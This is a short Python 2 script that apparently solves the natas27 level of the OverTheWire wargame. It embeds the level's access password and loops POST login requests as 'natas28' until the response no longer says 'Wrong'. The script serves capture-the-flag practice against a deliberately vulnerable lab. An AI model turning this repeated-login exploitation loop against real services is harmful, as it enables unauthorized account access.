import requests

host = "http://natas27.natas.labs.overthewire.org/"
username="natas27"
password="55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
data=dict()
data["username"]="natas28"
data["password"]="test"
r = requests.post(host,data=data,auth=(username,password))
print r.text
print "==================================="
while "Wrong" in r.text:
    try:
        r = requests.post(host,data=data,auth=(username,password))
    except requests.exceptions.ConnectionError:
        print "connection error"
print r.text
